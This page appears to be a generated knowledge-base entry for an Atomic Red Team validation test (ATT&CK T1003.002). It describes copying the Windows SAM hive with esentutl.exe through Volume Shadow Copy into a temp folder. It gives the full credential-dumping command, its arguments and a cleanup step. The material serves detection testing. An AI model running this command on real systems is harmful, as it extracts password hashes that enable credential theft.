---
atomic_guid: "a90c2f4d-6726-444e-99d2-a00cd7c20480"
title: "esentutl.exe SAM copy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "a90c2f4d-6726-444e-99d2-a00cd7c20480"
  - "esentutl.exe SAM copy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# esentutl.exe SAM copy

Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.

## Metadata

- Atomic GUID: a90c2f4d-6726-444e-99d2-a00cd7c20480
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Input Arguments

### copy_dest

- description: Destination of the copied file
- type: string
- default: %temp%

### file_name

- description: Name of the copied file
- type: string
- default: SAM

### file_path

- description: Path to the file to copy
- type: path
- default: %SystemRoot%/system32/config/SAM

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
```

### Cleanup

```commandprompt
del #{copy_dest}\#{file_name} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
